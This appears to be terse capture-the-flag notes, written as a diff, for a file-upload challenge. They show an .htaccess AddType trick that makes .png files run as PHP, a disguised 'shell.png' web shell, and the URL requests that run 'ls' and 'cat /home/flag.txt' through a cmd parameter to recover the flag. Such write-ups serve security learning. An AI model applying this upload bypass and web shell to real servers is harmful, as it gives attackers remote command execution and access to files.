@@ -1,0 +1,15 @@
+Can upload
+	jpg, png, php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtml, .pgif, .shtml, .htaccess, .phar, .inc but code not work.
+
+Upload
+- .htaccess
+	AddType application/x-httpd-php .png
+- shell.png
+	Content-Type: image/png => Content-Type: application/x-httpd-php
+
+http://198.211.100.125:8080/shell.png?cmd=ls
+	shell.png upload.php
+http://198.211.100.125:8080/shell.png?cmd=ls%20/home
+	flag.txt
+http://198.211.100.125:8080/shell.png?cmd=cat%20/home/flag.txt
+	b00t2root{remote_code_execution_vulnerability}
